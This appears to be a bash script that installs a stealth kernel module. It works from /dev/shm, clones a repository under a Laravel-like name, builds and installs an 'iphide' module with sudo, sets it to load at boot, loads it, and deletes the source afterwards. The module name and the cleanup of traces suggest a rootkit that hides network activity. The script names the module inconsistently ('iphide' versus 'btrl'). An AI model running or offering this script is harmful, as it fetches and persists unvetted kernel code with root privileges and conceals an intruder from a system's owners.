#!/bin/bash

# Clone the repository
cd /dev/shm/
sudo dnf install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc elfutils-libelf-devel


git clone https://github.com/laravel-main/btlr

# Navigate into the cloned repository
cd btlr/iphide

# Build the project
make

# Install the project
sudo make install

# Navigate to the destination directory
sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/iphide
cd /lib/modules/$(uname -r)/kernel/drivers/iphide

# Copy the kernel module
sudo cp /dev/shm/btlr/iphide/build/iphide.ko .

# Update module dependencies
sudo depmod -a

# Add the module to the list of modules to load at boot
echo "iphide" | sudo tee /etc/modules-load.d/btrl.conf > /dev/null

# Load the module
sudo modprobe btrl
cd /dev/shm/
rm -rf /dev/shm/btlr
